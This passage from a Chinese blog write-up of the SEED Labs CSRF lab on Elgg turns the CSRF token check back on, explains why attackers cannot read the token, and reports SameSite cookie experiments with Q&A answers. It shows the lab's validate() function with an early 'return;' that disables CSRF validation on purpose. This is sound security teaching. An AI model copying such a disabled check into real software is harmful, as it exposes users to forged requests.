+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">elgg.security.token.__elgg_ts<span class="hljs-comment">;</span><br>elgg.security.token.__elgg_token<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>秘密令牌和时间戳由 vendor&#x2F;elgg&#x2F;elgg&#x2F;views&#x2F;default&#x2F;input&#x2F;securitytoken.php 模块添加到 Elgg 的网页中。下面的代码片段显示了它们是如何被动态地添加到网页中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ts</span> = <span class="hljs-keyword">time</span>();<br><span class="hljs-variable">$token</span> = elgg()-&gt;csrf-&gt;generateActionToken(<span class="hljs-variable">$ts</span>);<br><span class="hljs-built_in">echo</span> elgg_view(<span class="hljs-string">&#x27;input/hidden&#x27;</span>,[<span class="hljs-string">&#x27;name&#x27;</span> =&gt;<span class="hljs-string">&#x27;__elgg_token&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span> =&gt;<span class="hljs-variable">$token</span>]);<br><span class="hljs-built_in">echo</span> elgg_view(<span class="hljs-string">&#x27;input/hidden&#x27;</span>,[<span class="hljs-string">&#x27;name&#x27;</span> =&gt;<span class="hljs-string">&#x27;__elgg_ts&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span> =&gt;<span class="hljs-variable">$ts</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>秘密令牌生成Elgg的秘密令牌是一个哈希值（MD5信息摘要），这个哈希值是由该网站上的秘密值（从 数据库检索得到）、时间戳、用户会话ID和随机生成的会话字符串所共同生成。下面的代码显示了Elgg中 秘密令牌的生成过程（在vendor&#x2F;elgg&#x2F;elgg&#x2F;engine&#x2F;classes&#x2F;Elgg&#x2F;Security&#x2F;Csrf.php中）。</p>
+<p>秘密令牌验证elgg网络应用程序验证了生成的令牌和时间戳，以防御CSRF攻击。每个用户操作都会调 用Csrf.php中的validate函数，该函数的作用就是验证令牌。如果令牌不存在或无效，该用户操作将 被拒绝，且用户将被重定向。在我们的设置中，我们在这个函数的开头添加了一个return，因此该验证 程序被禁用。</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso">publicfunctionvalidate(Request $request)&#123;<br><span class="hljs-keyword">return</span>; <span class="hljs-comment">//Addedfor SEED Labs (disabling theCSRF countermeasure)</span><br>$token=$request-&gt;GETParam(<span class="hljs-string">&#x27;__elgg_token&#x27;</span>);<br>$ts=$request-&gt;GETParam(<span class="hljs-string">&#x27;__elgg_ts&#x27;</span>);<br><span class="hljs-params">...</span>(codeomitted) <span class="hljs-params">...</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p> <strong>Task</strong>：开启防御措施要打开防御措施，首先要进入Elgg容器的&#x2F;var&#x2F;www&#x2F;elgg&#x2F;vendor&#x2F;elgg&#x2F;elgg&#x2F;engine&#x2F;classes&#x2F;Elgg&#x2F;Security文件夹，从Csrf.php中删除return语句。你可以使用一个内置在容器中的简单编辑器，名为nano。在做了修改之后再次重复之前的攻击，看看你的攻击是否会成功。请指出捕获的HTTP请求中的秘密令牌，并解释为什么攻击者为什么不能在CSRF攻击中发送这些秘密令牌； 是什么阻止了他们从网页上发现秘密令牌？</p>
+<p>应该注意的是（重要），当我们发起编辑资料攻击的时候，失败的尝试将导致攻击者的页面被重新加载。这将会再次触发伪造的POST请求，从而导致另一次失败的尝试，那么页面又将再次被重新加载，再 次触发伪造的POST请求。这种无休止的循环会拖慢你的计算机。因此，在验证了攻击失败后，你需要关 闭该标签以停止无休止的循环。</p>
+<p>我们先用nano改代码，注释掉下面这句</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">return</span>; <span class="hljs-comment">// Added for SEED Labs (disabling the CSRF countermeasure)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155663.png" srcset="/img/loading.gif" lazyload alt="image-20251107213859855"></p>
+<p>然后尝试攻击，两种攻击都失败</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155447.png" srcset="/img/loading.gif" lazyload alt="image-20251107214011585"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155572.png" srcset="/img/loading.gif" lazyload alt="image-20251107214054949"></p>
+<p>捕获一个HTTP POST请求，秘密令牌如图</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155937.png" srcset="/img/loading.gif" lazyload alt="image-20251107215143015"></p>
+<p>什么攻击者不能伪造合法的CSRF请求？</p>
+<p>CSRF Token（秘密令牌）是随机且与会话绑定的。服务器每次生成的 __elgg_token 不一样，并且只对当前已登录的用户有效。</p>
+<p>攻击者的网页无法获取受害者的 CSRF Token：</p>
+<p>__elgg_token 只存在于受害者已登录的 session（通常只在用户的真正表单页面里、HTML 源码或 JS 变量中）；跨站点脚本（CSRF攻击页面）未获得 victim 用户的 document 上的数据访问权限，无法读取页面里的 CSRF token。</p>
+<p>是什么机制阻止了他们偷到受害者CSRF Token？</p>
+<p>同源策略：攻击者页面的 JS 无法访问 victim domain 下的 cookie、页面内容等敏感数据；token只对特定用户&#x2F;会话有效：即使攻击者POST时硬编码了一个token参数，该token必须和受害者session匹配，否则校验失败。</p>
+<h2 id="Task5：测试同站Cookie方法"><a href="#Task5：测试同站Cookie方法" class="headerlink" title="Task5：测试同站Cookie方法"></a>Task5：测试同站Cookie方法</h2><p>大多数浏览器现在已经实现了一种叫做同站cookie的机制，这是一个与cookie相关联的属性。当发 出请求时，浏览器将检查cookie这个属性，并决定是否在跨站请求中附加这个cookie。当web应用程序 认为某个cookie不应该被附加到跨站请求中时，可以将cookie设置为同站cookie。例如，可以将会话ID cookie 标记为同站cookie，因此没有任何跨站请求可以使用该会话ID，从而将无法发起CSRF攻击。</p>
+<p>为了帮助学生了解同站cookie如何抵御CSRF攻击，我们在一个容器上创建了名为<a target="_blank" rel="noopener" href="http://www.example32/">www.example32</a>. com 的网站。请访问以下网址（主机名已经在&#x2F;etc&#x2F;hosts文件中被映射到 10.9.0.5；如果不使用SEED 虚拟机，你应该在你的机器上添加这个映射）。</p>
+<p>当访问该网站时，浏览器上会设置三个cookie，分别是：cookie-normal、cookie-lax和cookie-strict。 正如其名称所示，第一个cookie只是一个普通的cookie，第二个和第三个cookie是两种不同类型的同站 cookie（Lax 和 Strict）。我们设计了两组实验来观察当发送HTTP请求时，哪些cookie会被附加到服务 器上。通常情况下，属于服务器的所有cookie都将被附加到请求中，除了同站cookie。</p>
+<p>请点击两个实验的链接。链接A指向 example32.com上的一个页面，而链接B则指向attacker32. com 上一个页面。两个页面都是相同的（除了背景颜色），并且它们都发送三种不同的请求到www. example32.com&#x2F;showcookies.php，这个链接只是显示浏览器发送的cookies。通过观察显示的结果，你 可以知道哪些cookie会被浏览器发送。请完成以下要求：</p>
+<ul>
+<li>请描述你所看到的情况，并解释为什么在某些情况下不发送一些cookie。</li>
+<li>根据你的理解，请描述同站cookies如何帮助服务器检测一个请求是跨站还是同站请求。</li>
+<li>请描述你将如何使用同站cookie机制来帮助Elgg防御CSRF攻击。只需要描述思路，无需实现。</li>
+</ul>
+<p>先点link A，这是same-site request</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155222.png" srcset="/img/loading.gif" lazyload alt="image-20251107215549779"></p>
+<p>发现有GET和POST两种传参方式</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155638.png" srcset="/img/loading.gif" lazyload alt="image-20251107215637262"></p>
+<p>其结果一致，这俩种传参方式的cookie-normal、cookie-lax和cookie-strict都传递，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155260.png" srcset="/img/loading.gif" lazyload alt="image-20251107215720500"></p>
+<p>再点link A，这是cross-site request</p>
+<p>也是GET和POST两种传参方式</p>
+<p>GET传参：</p>
+<p>cookie-normal和cookie-lax传递；cookie-strict不传递</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155161.png" srcset="/img/loading.gif" lazyload alt="image-20251107215829320"></p>
+<p>POST传参：</p>
+<p>cookie-normal传递；cookie-lax和cookie-strict不传递</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155007.png" srcset="/img/loading.gif" lazyload alt="image-20251107215905951"></p>
+<ul>
+<li><p>Q1：</p>
+<ul>
+<li><p><strong>同站（same-site）请求</strong>：<br> 不论是 GET 还是 POST，所有 cookie（normal、lax、strict）都会随请求发送。</p>
+</li>
+<li><p><strong>跨站（cross-site）请求</strong>：<br>GET ： 只发送 normal 和 lax，strict 不发送。</p>
+<p>POST： 只发送 normal，lax 和 strict 都不发送。</p>
+</li>
+</ul>
+<p>**原因：**ameSite Cookie 策略控制了 cookie 的发送。<code>SameSite=Strict</code>：<strong>只有完全同源（same-site）时才发送</strong>。跨站 GET&#x2F;POST 都不会带；<code>SameSite=Lax</code>：跨站 GET（如点击普通链接、跳转）会带 cookie，但跨站 POST（如表单提交）不会带。这是浏览器的安全默认策略，防止 CSRF；<code>SameSite=None</code> 或无设置（即 normal）：任何情况下都发送，但现代浏览器要求 <code>None</code> 必须配合 <code>Secure</code> 使用。</p>
+</li>
+<li><p>Q2：</p>
+<p>服务器可以<strong>通过是否收到特定类型的 cookie（尤其是 SameSite&#x3D;Strict 或 Lax 的 cookie）</strong>，判断请求是不是同站发起：</p>
+<ul>
+<li>如果服务器发现带着 strict 或 lax 的cookie，很大概率这个请求就是 same-site 产生。</li>
+<li>如果 cookie 丢失，特别是 only strict&#x2F;lax 类型丢了，很可能是跨站点发起（比如其他网站诱导你向本网站发起请求）。</li>
+<li>结合 <code>Referer</code> 和 <code>Origin</code> 头部，服务器可以进一步判断请求来源，但 SameSite 机制更为直接和自动。</li>
+</ul>
+</li>
+<li><p>Q3：</p>
+<p>登录后，Elgg 可以设置一个 SameSite&#x3D;Strict 或 SameSite&#x3D;Lax 的 session 级 cookie，比如 <code>ElggSessionID</code>。对关键敏感操作（比如资料修改、加好友等 POST&#x2F;PUT&#x2F;DELETE），后端服务器检测请求时要求必须带上这个 SameSite Cookie。</p>
+<p>如果访问是 same-site，浏览器会自动带上 cookie，用户体验无感。如果是跨站 POST（即攻击者用隐藏表单从其他网站伪造请求），浏览器不会带上这个 SameSite Cookie，服务器可以检测到并拒绝处理——这就拦下了大多数CSRF。</p>
+<p>进一步提升安全性，可以双重防御：既检测CSRF token参数，也检测 SameSite Cookie 是否存在且匹配。</p>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class="category-chain-item">软件安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SEEDlabs/" class="print-no-link">#SEEDlabs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>软件安全实验 SEEDlabs 跨站请求伪造攻击实验</div>
+      <div>http://example.com/2026/test38/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test35/" title="软件安全实验 SEEDlabs 环境变量与Set-UID 实验">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">软件安全实验 SEEDlabs 环境变量与Set-UID 实验</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test40/" title="软件安全实验 SEEDlabs 模糊测试技术实验（基于AFL）">
+                        <span class="hidden-mobile">软件安全实验 SEEDlabs 模糊测试技术实验（基于AFL）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
